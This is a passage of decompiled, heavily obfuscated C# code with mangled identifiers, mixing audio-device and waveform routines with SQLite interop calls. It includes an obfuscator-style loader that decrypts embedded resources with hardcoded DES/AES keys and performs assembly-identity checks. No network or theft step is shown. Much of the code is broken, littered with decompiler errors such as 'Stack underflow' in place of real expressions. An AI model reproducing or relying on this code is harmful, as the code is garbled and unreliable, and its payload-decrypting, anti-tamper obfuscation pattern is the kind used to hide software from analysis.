			if (_0003._0001._0001._0001 != (double)num)
			{
				_0018._0001(_0003._0001, (double)num);
			}
			_0003._0001._0001 = _0003._0001;
			_0003.NumberOfInputChannels = _0004;
			global::_0016._0012 obj = _0003._0001;
			int num2 = _0003.NumberOfOutputChannels;
			int num3 = _0003.NumberOfInputChannels;
			_0003._0001 = _0018._0001(num3, num2, obj, false);
			global::_0016._0012 obj2 = _0003._0001;
			int num4 = _0003.ChannelOffset;
			int num5 = _0003.InputChannelOffset;
			_0018._0001(num5, obj2, num4);
			if (P_3 != null)
			{
				_0003._0001 = new byte[_0003._0001 * _0003.NumberOfOutputChannels * P_3.WaveFormat._0003 / 8];
			}
		}

		static DataTable _0001()
		{
			//IL_0101: Incompatible stack heights: 0 vs 1
			//IL_010b: Incompatible stack heights: 0 vs 1
			_0080._0014._0001(107398901);
			new DataTable((string?)/*Error near IL_010b: Stack underflow*/);
			DataTable dataTable = (DataTable)/*Error near IL_0111: Stack underflow*/;
			_0001_0005._007E_008A_000E(dataTable, _008F_0003._008B_0007());
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107377154), _0091._0080_0004(typeof(string).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107377645), _0091._0080_0004(typeof(int).TypeHandle));
			_0003_0005._007E_008C_000E(_0002_0005._007E_008B_000E(dataTable), _0080._0014._0001(107377648), _0091._0080_0004(typeof(int).TypeHandle));
			global::_0008._007E_0011_0002(dataTable);
			StringReader stringReader = new StringReader(global::_0005._0019.MetaDataCollections);
			_001C_0006._007E_0011_0010(dataTable, stringReader);
			global::_0008._007E_001E_0002(stringReader);
			global::_0008._007E_0013_0002(dataTable);
			global::_0008._007E_0012_0002(dataTable);
			return dataTable;
		}

		static string _0001(IntPtr _0002, int _0003)
		{
			//IL_0068: Incompatible stack heights: 0 vs 2
			//IL_006f: Incompatible stack heights: 0 vs 1
			//IL_0072: Incompatible stack heights: 0 vs 1
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_006f: Stack underflow*/((IntPtr)/*Error near IL_006f: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0 || (int)/*Error near IL_0014: Stack underflow*/ == 0)
			{
				return string.Empty;
			}
			if (_0003 < 0)
			{
				_0003 = 0;
				while (_0001_0007._0095_0010(_0002, _0003) != 0)
				{
					_0003++;
				}
				if (_0003 == 0)
				{
					return string.Empty;
				}
			}
			byte[] array = new byte[_0003];
			_0011_0003._008D_0006(_0002, array, 0, _0003);
			return _0084_0002._007E_008D_0005(global::_0001._001A._0001, array, 0, _0003);
		}

		static void _0001(_001E._0004 _0002, int _0003, global::_0010._0004 _0004, global::_000F._0004 _0005, long _0006, long P_5)
		{
			//IL_0021: Incompatible stack heights: 0 vs 2
			//IL_0024: Incompatible stack heights: 0 vs 2
			//IL_0027: Incompatible stack heights: 0 vs 1
			_ = global::_0007._0097;
			_ = ((_001E._0004)/*Error near IL_000c: Stack underflow*/)._0001;
			int num = ((global::_0013._0005)/*Error near IL_001a: Stack underflow*/)._0001((int)/*Error near IL_001a: Stack underflow*/, (global::_0010._0004)/*Error near IL_001a: Stack underflow*/, _0005, _0006, P_5);
			/*Error near IL_001f: Stack underflow*/(num);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_column_type")]
		static extern global::_0014._0017 _0001(IntPtr _0002, int _0003);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static IntPtr _0001(IntPtr _0002, int _0003)
		{
			//IL_0007: Unknown result type (might be due to invalid IL or missing references)
			//IL_0010: Incompatible stack heights: 0 vs 1
			//IL_0013: Incompatible stack heights: 0 vs 1
			//IL_001a: Expected I8, but got Unknown
			//IL_001a: Incompatible stack heights: 0 vs 1
			_0002.ToInt64();
			long num = (long)/*Error near IL_0007: Stack underflow*/;
			new IntPtr(/*Error near IL_0008: Stack underflow*/ + num);
			return (IntPtr)/*Error near IL_000b: Stack underflow*/;
		}

		static bool _0001(DbType _0002, global::_0001._001D P_1)
		{
			//IL_001b: Incompatible stack heights: 0 vs 1
			//IL_001e: Incompatible stack heights: 0 vs 1
			//IL_0021: Incompatible stack heights: 0 vs 2
			if (((global::_0001._001D)/*Error near IL_0007: Stack underflow*/)._0001 == null)
			{
				return false;
			}
			_ = ((global::_0001._001D)/*Error near IL_0012: Stack underflow*/)._0001;
			return ((Dictionary<DbType, global::_0006._0018>)/*Error near IL_0019: Stack underflow*/).Remove((DbType)/*Error near IL_0019: Stack underflow*/);
		}

		static long _0001(global::_0005._0008 _0002, long P_1)
		{
			//IL_001c: Unknown result type (might be due to invalid IL or missing references)
			//IL_001e: Expected F8, but got Unknown
			//IL_0048: Incompatible stack heights: 0 vs 1
			//IL_004b: Incompatible stack heights: 0 vs 2
			//IL_0052: Incompatible stack heights: 0 vs 1
			_ = (double)((global::_0005._0008)/*Error near IL_0007: Stack underflow*/)._0001._0002;
			_ = ((global::_0005._0008)/*Error near IL_0014: Stack underflow*/)._0001.WaveFormat;
			int num = ((global::_0005._0005)/*Error near IL_001b: Stack underflow*/)._0002;
			double num2 = /*Error near IL_001d: Stack underflow*// (double)num;
			long num3 = (long)((double)P_1 * num2);
			if (num3 % _0002._0001.BlockAlign != 0L)
			{
				num3 -= num3 % _0002._0001.BlockAlign;
			}
			return num3;
		}

		static void _0001()
		{
			//IL_0060: Incompatible stack heights: 0 vs 1
			if (!_001B._0013._0001)
			{
				int num = 2;
				_008D._0019_0004();
				OperatingSystem operatingSystem = (OperatingSystem)/*Error near IL_0063: Stack underflow*/;
				if (global::_001A._007E_0010_0003(_008E._007E_001A_0004(operatingSystem)) == 6 && global::_001A._007E_0011_0003(_008E._007E_001A_0004(operatingSystem)) == 0)
				{
					num = 1;
				}
				_0018._0001((num << 16) | 0x70, 0);
				_001B._0013._0001 = true;
			}
		}

		static double _0001(int _0002, int _0003)
		{
			//IL_0023: Unknown result type (might be due to invalid IL or missing references)
			//IL_0027: Unknown result type (might be due to invalid IL or missing references)
			//IL_0029: Unknown result type (might be due to invalid IL or missing references)
			//IL_002c: Unknown result type (might be due to invalid IL or missing references)
			//IL_002d: Unknown result type (might be due to invalid IL or missing references)
			//IL_002f: Expected F8, but got Unknown
			//IL_0030: Incompatible stack heights: 0 vs 5
			//IL_0033: Incompatible stack heights: 0 vs 2
			//IL_003a: Expected F8, but got Unknown
			//IL_003a: Incompatible stack heights: 0 vs 1
			_ = 0.5;
			_ = 1.0;
			_ = global::_0015._009A_0002;
			_ = Math.PI * 2.0;
			double num = (double)/*Error near IL_0023: Stack underflow*/;
			_ = /*Error near IL_0024: Stack underflow*/* num;
			_003F val = /*Error near IL_0028: Stack underflow*/- 1;
			_003F val2 = /*Error near IL_002a: Stack underflow*// (double)val;
			/*Error near IL_003a: Stack underflow*/((double)val2);
			_003F val3 = /*Error near IL_002d: Stack underflow*/- /*Error near IL_002d: Stack underflow*/;
			return /*Error near IL_002e: Stack underflow*/* val3;
		}

		static void _0001(bool _0002, bool _0003)
		{
			//IL_0016: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			_0018._0001((byte)/*Error near IL_001d: Stack underflow*/ != 0);
			_0080._0017 obj = (_0080._0017)/*Error near IL_0020: Stack underflow*/;
			if (obj != 0 && !_0002)
			{
				throw new SQLiteException(obj, null);
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_set_authorizer")]
		static extern IntPtr _0001(IntPtr _0002, _0019._001D _0003, IntPtr _0004);

		static byte[] _0001(byte[] _0002)
		{
			//IL_0276: Incompatible stack heights: 0 vs 1
			//IL_0286: Incompatible stack heights: 0 vs 1
			Assembly.GetCallingAssembly();
			Assembly assembly = (Assembly)/*Error near IL_027c: Stack underflow*/;
			Assembly.GetExecutingAssembly();
			Assembly assembly2 = (Assembly)/*Error near IL_0010: Stack underflow*/;
			if ((object)assembly != assembly2 && !_0018._0001(assembly, assembly2))
			{
				return null;
			}
			global::_0017._007F._000F obj = new global::_0017._007F._000F(_0002);
			byte[] array = new byte[0];
			int num = _0018._0001(obj);
			if (num == 67324752)
			{
				short num2 = (short)_0018._0001(obj);
				int num3 = _0018._0001(obj);
				int num4 = _0018._0001(obj);
				if (num != 67324752 || num2 != 20 || num3 != 0 || num4 != 8)
				{
					throw new FormatException("Wrong Header Signature");
				}
				_0018._0001(obj);
				_0018._0001(obj);
				_0018._0001(obj);
				int num5 = _0018._0001(obj);
				int num6 = _0018._0001(obj);
				int num7 = _0018._0001(obj);
				if (num6 > 0)
				{
					byte[] buffer = new byte[num6];
					obj.Read(buffer, 0, num6);
				}
				if (num7 > 0)
				{
					byte[] buffer2 = new byte[num7];
					obj.Read(buffer2, 0, num7);
				}
				byte[] array2 = new byte[obj.Length - obj.Position];
				obj.Read(array2, 0, array2.Length);
				global::_0017._007F._0001 obj2 = new global::_0017._007F._0001(array2);
				array = new byte[num5];
				global::_0017._007F._0001 obj3 = obj2;
				byte[] array3 = array;
				int num8 = array.Length;
				_0018._0001(num8, array3, obj3, 0);
				array2 = null;
			}
			else
			{
				int num9 = num >> 24;
				num -= num9 << 24;
				if (num != 8223355)
				{
					throw new FormatException("Unknown Header");
				}
				if (num9 == 1)
				{
					int num10 = _0018._0001(obj);
					array = new byte[num10];
					int num12;
					for (int i = 0; i < num10; i += num12)
					{
						int num11 = _0018._0001(obj);
						num12 = _0018._0001(obj);
						byte[] array4 = new byte[num11];
						obj.Read(array4, 0, array4.Length);
						_0018._0001(num12, array, new global::_0017._007F._0001(array4), i);
					}
				}
				if (num9 == 2)
				{
					byte[] array5 = new byte[8] { 173, 17, 188, 188, 153, 231, 45, 48 };
					byte[] array6 = new byte[8] { 178, 24, 236, 148, 77, 94, 85, 204 };
					using ICryptoTransform cryptoTransform = _0018._0001(array6, _0003: true, array5);
					array = _0018._0001(cryptoTransform.TransformFinalBlock(_0002, 4, _0002.Length - 4));
				}
				if (num9 == 3)
				{
					byte[] array7 = new byte[16]
					{
						1, 1, 1, 1, 1, 1, 1, 1, 1, 1,
						1, 1, 1, 1, 1, 1
					};
					byte[] array8 = new byte[16]
					{
						2, 2, 2, 2, 2, 2, 2, 2, 2, 2,
						2, 2, 2, 2, 2, 2
					};
					using ICryptoTransform cryptoTransform2 = _0018._0001(_0002: true, array7, array8);
					array = _0018._0001(cryptoTransform2.TransformFinalBlock(_0002, 4, _0002.Length - 4));
				}
			}
			obj.Close();
			obj = null;
			return array;
		}

		static void _0001(int _0002, global::_0017._007F._000E P_1)
		{
			//IL_003b: Incompatible stack heights: 0 vs 1
			//IL_003e: Incompatible stack heights: 0 vs 2
			//IL_0041: Incompatible stack heights: 0 vs 1
			_ = ((global::_0017._007F._000E)/*Error near IL_0007: Stack underflow*/)._0001;
			int num = ((global::_0017._007F._000E)/*Error near IL_0010: Stack underflow*/)._0002;
			((global::_0017._007F._000E)/*Error near IL_0019: Stack underflow*/)._0002 = num + 1;
			((sbyte[])/*Error near IL_001d: Stack underflow*/)[num] = (sbyte)(byte)_0002;
			P_1._0001[P_1._0002++] = (byte)(_0002 >> 8);
		}

		static void _0001(global::_0004._0008 _0002, BinaryWriter P_1)
		{
			//IL_0046: Incompatible stack heights: 0 vs 2
			//IL_0049: Incompatible stack heights: 0 vs 1
			//IL_0050: Incompatible stack heights: 0 vs 1
			_ = _009E_0002._007E_001B_0006;
			long num = ((global::_0004._0008)/*Error near IL_000e: Stack underflow*/)._0002;
			/*Error near IL_0050: Stack underflow*/((object)/*Error near IL_0050: Stack underflow*/, (int)num, SeekOrigin.Begin);
			_009F_0002._007E_001C_0006(P_1, _0018._0001(_0002._0001 * 8 / _0002._0001._0003 / _0002._0001._0001, _0002));
		}

		static void _0001()
		{
			//IL_010e: Incompatible stack heights: 0 vs 1
			//IL_0118: Incompatible stack heights: 0 vs 1
			//IL_011e: Incompatible stack heights: 0 vs 2
			_0080._0014._0001(107377583);
			_0018._0001((string)/*Error near IL_0118: Stack underflow*/, (string)null);
			if ((int)/*Error near IL_0012: Stack underflow*/ != 0)
			{
				return;
			}
			_ = _0091_0002._009C_0005;
			object obj = global::_0017._0084._0001;
			/*Error near IL_0028: Stack underflow*/((object)/*Error near IL_0028: Stack underflow*/);
			try
			{
				if (global::_0017._0084._0001 == null)
				{
					global::_0017._0084._0001 = new Dictionary<string, string>(_007F_0004._008D_0008());
					global::_0017._0084._0001.Add(_0080._0014._0001(107353185), _0080._0014._0001(107377590));
					global::_0017._0084._0001.Add(_0080._0014._0001(107353194), _0080._0014._0001(107377549));
					global::_0017._0084._0001.Add(_0080._0014._0001(107377544), _0080._0014._0001(107377567));
					global::_0017._0084._0001.Add(_0080._0014._0001(107377554), _0080._0014._0001(107377517));
				}
				if (_0090_0002._009A_0005(global::_0017._0084._0001, IntPtr.Zero))
				{
					string text = null;
					string text2 = null;
					_0018._0001(ref text, ref text2);
					_0018._0001(text2, text, ref global::_0017._0084._0010, ref global::_0017._0084._0001);
				}
			}
			finally
			{
				_0091_0002._009D_0005(obj);
			}
		}

		static IntPtr _0001(global::_0001._0082 _0002, IntPtr _0003)
		{
			//IL_0024: Incompatible stack heights: 0 vs 2
			//IL_002b: Incompatible stack heights: 0 vs 1
			//IL_002e: Incompatible stack heights: 0 vs 2
			_ = _0090_0002._009A_0005;
			IntPtr zero = IntPtr.Zero;
			/*Error near IL_002b: Stack underflow*/((IntPtr)/*Error near IL_002b: Stack underflow*/, zero);
			if ((int)/*Error near IL_0010: Stack underflow*/ != 0)
			{
				return IntPtr.Zero;
			}
			_ = _0019_0003._0095_0006;
			return /*Error near IL_0022: Stack underflow*/((IntPtr)/*Error near IL_0022: Stack underflow*/);
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static global::_0014._0017 _0001(Type _0002)
		{
			//IL_0040: Incompatible stack heights: 0 vs 2
			//IL_0047: Incompatible stack heights: 0 vs 1
			_ = _009D_0004._0086_000E;
			/*Error near IL_0047: Stack underflow*/((Type)/*Error near IL_0047: Stack underflow*/);
			TypeCode typeCode = (TypeCode)/*Error near IL_004a: Stack underflow*/;
			if (typeCode == TypeCode.Object)
			{
				if ((object)_0002 == _0091._0080_0004(typeof(byte[]).TypeHandle) || (object)_0002 == _0091._0080_0004(typeof(Guid).TypeHandle))
				{
					return global::_0014._0017._0005;
				}
				return global::_0014._0017._0004;
			}
			return global::_0001._001A._0001[(int)typeCode];
		}

		static void _0001(global::_0018._000E _0002, _001C._0004 P_1)
		{
			//IL_00e9: Incompatible stack heights: 0 vs 1
			//IL_00f3: Incompatible stack heights: 0 vs 1
			//IL_00fd: Incompatible stack heights: 0 vs 1
			_ = ((_001C._0004)/*Error near IL_00f3: Stack underflow*/).WaveFormat;
			if (((global::_0005._0005)/*Error near IL_000f: Stack underflow*/)._0001 != WaveFormatEncoding.IeeeFloat)
			{
				_0080._0014._0001(107358512);
				throw new ArgumentException(paramName: _0080._0014._0001(107377508), message: (string?)/*Error near IL_002b: Stack underflow*/);
			}
			if (P_1.WaveFormat._0003 != 32)
			{
				throw new ArgumentException(_0080._0014._0001(107357946), _0080._0014._0001(107377508));
			}
			if (_0002._0001.Count == 0)
			{
				int num = P_1.WaveFormat._0001;
				int num2 = P_1.WaveFormat._0001;
				_0002._0001 = _0018._0001(num, num2);
			}
			else if (!_0087_0004._007E_009A_0008(P_1.WaveFormat, _0002._0001))
			{
				throw new ArgumentException(_0080._0014._0001(107357861), _0080._0014._0001(107377508));
			}
			List<_001C._0004> list = _0002._0001;
			_0091_0002._009C_0005(list);
			try
			{
				_0002._0001.Add(P_1);
			}
			finally
			{
				_0091_0002._009D_0005(list);
			}
		}

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerOpen")]
		static extern MmResult _0001(out IntPtr _0002, int _0003, IntPtr _0004, IntPtr _0005, _001D._0001 _0006);

		static double _0001(global::_0017._0015 P_0)
		{
			//IL_002e: Incompatible stack heights: 0 vs 1
			//IL_0031: Incompatible stack heights: 0 vs 1
			//IL_0034: Incompatible stack heights: 0 vs 2
			_ = ((global::_0017._0015)/*Error near IL_0009: Stack underflow*/)._0001._0001;
			IntPtr pUnknown = ((global::_0017._0015)/*Error near IL_0015: Stack underflow*/)._0001;
			double sampleRate;
			AsioError num = /*Error near IL_001c: Stack underflow*/(pUnknown, out sampleRate);
			string text = _0080._0014._0001(107377475);
			_0018._0001((global::_0017._0015)/*Error near IL_002b: Stack underflow*/, num, text);
			return sampleRate;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_memory_used")]
		static extern long _0001();

		static void _0001(int _0002, int _0003, double _0004, float[] _0005, float[] _0006, global::_000E._0019 _0007, int _0008, int _000E, float[] P_8)
		{
			//IL_0016: Unknown result type (might be due to invalid IL or missing references)
			//IL_0019: Expected F8, but got Unknown
			//IL_0149: Incompatible stack heights: 0 vs 1
			//IL_0155: Incompatible stack heights: 0 vs 1
			int num = ((global::_000E._0019)/*Error near IL_000a: Stack underflow*/)._0007;
			_0004 = /*Error near IL_0017: Stack underflow*/* (double)num;
			int num2 = (int)_0004;
			_000E += num - 1 - num2;
			_0004 -= (double)num2;
			double num3 = 0.0;
			double num4 = 0.0;
			double num5 = 0.0;
			double num6 = 0.0;
			int num7 = _000E;
			int num8 = _0008;
			int num9 = _0002 / 2;
			while (num9-- != 0)
			{
				num3 += (double)(_0006[num7] * _0005[num8]);
				num4 += (double)(_0006[num7] * _0005[num8 + 1]);
				num5 += (double)(_0006[num7 + 1] * _0005[num8]);
				num6 += (double)(_0006[num7 + 1] * _0005[num8 + 1]);
				num3 += (double)(_0006[num7 + num] * _0005[num8 + 2]);
				num4 += (double)(_0006[num7 + num] * _0005[num8 + 3]);
				num5 += (double)(_0006[num7 + num + 1] * _0005[num8 + 2]);
				num6 += (double)(_0006[num7 + num + 1] * _0005[num8 + 3]);
				num8 += 4;
				num7 += num * 2;
			}
			P_8[_0003] = (float)(num3 * _0004 + num5 * (1.0 - _0004));
			P_8[_0003 + 1] = (float)(num4 * _0004 + num6 * (1.0 - _0004));
		}

		static void _0001(int _0002, _001D._0007 _0003, int P_2)
		{
			//IL_0012: Incompatible stack heights: 0 vs 1
			//IL_0015: Incompatible stack heights: 0 vs 1
			//IL_0018: Incompatible stack heights: 0 vs 1
			global::_0005._0005 obj = _0018._0001((int)/*Error near IL_000b: Stack underflow*/, (int)/*Error near IL_000b: Stack underflow*/);
			((_001D._0007)/*Error near IL_0010: Stack underflow*/)._0001 = obj;
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		static void _0001(global::_0002._0007 _0002, global::_0017._0011 P_1)
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0038: Incompatible stack heights: 0 vs 2
			List<global::_0002._0007> list = ((global::_0017._0011)/*Error near IL_0007: Stack underflow*/)._0001;
			_ = _0091_0002._009C_0005;
			/*Error near IL_0015: Stack underflow*/((object)/*Error near IL_0015: Stack underflow*/);
			try
			{
				P_1._0001.Remove(_0002);
			}
			finally
			{
				_0091_0002._009D_0005(list);
			}
		}

		static IEnumerable<global::_0014._0008> _0001()
		{
			//IL_0032: Incompatible stack heights: 0 vs 1
			//IL_0039: Incompatible stack heights: 0 vs 1
			//IL_0040: Incompatible stack heights: 0 vs 1
			new List<global::_0014._0008>();
			global::_0014._0008._0001 = (List<global::_0014._0008>)/*Error near IL_0007: Stack underflow*/;
			_0018._0001((global::_0008._0008._0001)_0018._0001, IntPtr.Zero, (global::_000F._0008)0);
			_0080._0014._0001(107377454);
			_0018._0001((MmResult)/*Error near IL_0027: Stack underflow*/, (string)/*Error near IL_0027: Stack underflow*/);
			return global::_0014._0008._0001;
		}

		[DllImport("Msacm32.dll", EntryPoint = "acmStreamUnprepareHeader")]
		static extern MmResult _0001(IntPtr _0002, [In][Out] global::_0013._000E _0003, int _0004);

		static byte _0001(_001F._0019 _0002, int P_1)
		{
			//IL_0052: Incompatible stack heights: 0 vs 1
			//IL_0055: Incompatible stack heights: 0 vs 1
			_0018._0001((_001F._0019)/*Error near IL_005c: Stack underflow*/, (int)/*Error near IL_005c: Stack underflow*/);
			if (_0002._0001[P_1]._0001 != null)
			{
				return _0003_0007._007E_0097_0010(_0002._0001[P_1]._0001._0001, _0002._0001[P_1]._0004);
			}
			throw new InvalidCastException();
		}

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("mscorwks.dll", CharSet = CharSet.Unicode, EntryPoint = "StrongNameSignatureVerificationEx")]
		[return: MarshalAs(UnmanagedType.Bool)]
		static extern bool _0001([MarshalAs(UnmanagedType.LPWStr)] string P_0, [MarshalAs(UnmanagedType.Bool)] bool P_1, [MarshalAs(UnmanagedType.Bool)] out bool P_2);

		[DllImport("winmm.dll", CharSet = CharSet.Ansi, EntryPoint = "mixerGetID")]
		static extern MmResult _0001(IntPtr _0002, out int _0003, _001D._0001 _0004);

		static void _0001(global::_0017._001B _0002, global::_0018._0017 P_1)
		{
			//IL_001a: Incompatible stack heights: 0 vs 1
			//IL_001d: Incompatible stack heights: 0 vs 1
			//IL_0020: Incompatible stack heights: 0 vs 2
			if (((global::_0017._001B)/*Error near IL_0007: Stack underflow*/)._0001 != null)
			{
				_ = ((global::_0017._001B)/*Error near IL_0010: Stack underflow*/)._0001;
				/*Error near IL_0018: Stack underflow*/((object)/*Error near IL_0018: Stack underflow*/, P_1);
			}
		}

		[DllImport("winmm.dll", EntryPoint = "midiInGetErrorText")]
		static extern MmResult _0001(int _0002, string _0003, int _0004);

		static int _0001([In][MarshalAs(UnmanagedType.Interface)] _001F._0015 _0002, _001C._0013 P_1)
		{
			//IL_000d: Incompatible stack heights: 0 vs 1
			//IL_0010: Incompatible stack heights: 0 vs 2
			//IL_0017: Incompatible stack heights: 0 vs 1
			_ = ((_001F._0015)/*Error near IL_0007: Stack underflow*/)._0001;
			((global::_0006._0015)/*Error near IL_0017: Stack underflow*/)._0001((_001C._0013)/*Error near IL_0017: Stack underflow*/);
			return (int)/*Error near IL_000c: Stack underflow*/;
		}

		static string _0001(int _0002)
		{
			//IL_00e7: Incompatible stack heights: 0 vs 1
			int num = (int)/*Error near IL_00ed: Stack underflow*/;
			byte[] array = _0080._0014._0001;
			int num2 = num;
			int num3 = num2 + 1;
			if (0 == 0)
			{
				num = num3;
			}
			int num4 = array[num2];
			int num5;
			if (((uint)num4 & 0x80u) != 0)
			{
				num5 = ((((uint)num4 & 0x40u) != 0) ? (((num4 & 0x1F) << 24) + (_0080._0014._0001[num++] << 16) + (_0080._0014._0001[num++] << 8) + _0080._0014._0001[num++]) : (((num4 & 0x3F) << 8) + _0080._0014._0001[num++]));
			}
			else
			{
				num5 = num4;
				if (num5 == 0)
				{
					return string.Empty;
				}
			}
			try
			{
				byte[] array2 = _0015_0005._009E_000E(_0084_0002._007E_008D_0005(_0082_0002._0088_0005(), _0080._0014._0001, num, num5));
				string text = global::_001E._0001_0004(_0084_0002._007E_008D_0005(_0082_0002._0088_0005(), array2, 0, array2.Length));
				if (_0080._0014._0001)
				{
					_0018._0001(_0002, text);
				}
				return text;
			}
			catch
			{
				return null;
			}
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_mprintf")]
		static extern IntPtr _0001(IntPtr _0002, __arglist);

		static void _0001(global::_0017._007F._0007 _0002, int P_1)
		{
			//IL_00bd: Incompatible stack heights: 0 vs 1
			//IL_00cd: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0017._007F._0007)/*Error near IL_000a: Stack underflow*/)._0003);
			_0018._0001(((global::_0017._007F._0007)/*Error near IL_0019: Stack underflow*/)._0001);
			_0018._0001(_0002._0002);
			_0018._0001(_0002._0001, _0002._0001._0002 - 257, 5);
			_0018._0001(_0002._0001, _0002._0002._0002 - 1, 5);
			_0018._0001(_0002._0001, P_1 - 4, 4);
			for (int i = 0; i < P_1; i++)
			{
				_0018._0001(_0002._0001, (int)_0002._0003._0001[global::_0017._007F._0007._0001[i]], 3);
			}
			_0018._0001(_0002._0001, _0002._0003);
			_0018._0001(_0002._0002, _0002._0003);
		}

		[DllImport("SQLite.Interop.dll", CallingConvention = CallingConvention.Cdecl, EntryPoint = "sqlite3_dispose_module")]
		static extern void _0001(IntPtr _0002);

		static void _0001(global::_0017._0006 P_0)
		{
			//IL_0053: Incompatible stack heights: 0 vs 1
			//IL_005a: Incompatible stack heights: 0 vs 1
			//IL_005d: Incompatible stack heights: 0 vs 1
			_0018._0001(((global::_0017._0006)/*Error near IL_0007: Stack underflow*/)._0001);
			if (((global::_0017._0006)/*Error near IL_0011: Stack underflow*/)._0001 != null)
			{
				for (int i = 0; i < P_0._0001.Length; i++)
				{
					P_0._0001[i]._0002();
				}
				P_0._0001 = null;
			}
			_0018._0001(P_0._0001);
			P_0._0001 = IntPtr.Zero;
		}

		static void _0001(global::_0012._0005 P_0)
		{
			//IL_00ae: Incompatible stack heights: 0 vs 1
			//IL_00b4: Incompatible stack heights: 0 vs 1
			//IL_00be: Incompatible stack heights: 0 vs 1
			try
			{
				new List<_001D._0008>((int)(((global::_0012._0005)/*Error near IL_000f: Stack underflow*/)._0001 / 400));
				((global::_0012._0005)/*Error near IL_0021: Stack underflow*/)._0001 = (List<_001D._0008>)/*Error near IL_0021: Stack underflow*/;
				global::_0005._0003 obj2;
				do
				{
					_001D._0008 obj = new _001D._0008();
					obj.FilePosition = global::_0012._007E_0091_0002(P_0._0001);
					obj.SamplePosition = P_0._0003;
					obj2 = _0018._0001(P_0, false);
					if (obj2 != null)
					{
						_0018._0001(obj2, P_0);
						P_0._0003 += obj2.SampleCount;
						obj.SampleCount = obj2.SampleCount;
						obj.ByteCount = (int)(global::_0012._007E_0091_0002(P_0._0001) - obj.FilePosition);
						P_0._0001.Add(obj);
					}
				}
				while (obj2 != null);
			}
			catch (EndOfStreamException)
			{
			}
		}

		static global::_0013._0017 _0001(global::_0010._001C P_0)
		{
			//IL_00cf: Incompatible stack heights: 0 vs 1
			//IL_00d5: Incompatible stack heights: 0 vs 1
			global::_0013._0017 obj = null;
			try
			{
				if (((global::_0010._001C)/*Error near IL_0010: Stack underflow*/)._0001 != null && ((global::_0010._001C)/*Error near IL_001f: Stack underflow*/)._0001._0001 != null)
				{
					if (P_0._0001 == null)
					{
						P_0._0003 = P_0._0002;
					}
					obj = P_0._0001._0001._0001(P_0._0001, P_0._0003, (P_0._0001 == null) ? null : P_0._0001[P_0._0001.Count - 1], (uint)(P_0._0002 * 1000), ref P_0._0003);
					if (obj != null)
					{
						obj._0001 = P_0;
						if (P_0._0001 == null)
						{
							P_0._0001 = new List<global::_0013._0017>();
						}
						P_0._0001.Add(obj);
						P_0._0001._0001(obj);
						_0018._0001(obj);
					}
				}
				return obj;
			}
			catch (Exception)
			{
				if (obj != null)
				{
					if (P_0._0001 != null && P_0._0001.Contains(obj))
					{
						P_0._0001.Remove(obj);
					}
					obj._0001();
				}
				P_0._0003 = null;
				throw;
			}
		}

		static double _0001(global::_000E._0019 P_0)
		{
			//IL_0010: Unknown result type (might be due to invalid IL or missing references)
			//IL_0018: Unknown result type (might be due to invalid IL or missing references)
			//IL_001a: Expected F8, but got Unknown
			//IL_0033: Incompatible stack heights: 0 vs 1
			//IL_0036: Incompatible stack heights: 0 vs 2
			//IL_0039: Incompatible stack heights: 0 vs 2
			_ = (double)((global::_000E._0019)/*Error near IL_0007: Stack underflow*/)._0006;
			int num = ((global::_000E._0019)/*Error near IL_000f: Stack underflow*/)._0005;
			_ = /*Error near IL_0011: Stack underflow*/- (double)num;
			double num2 = ((global::_000E._0019)/*Error near IL_0018: Stack underflow*/)._0002;
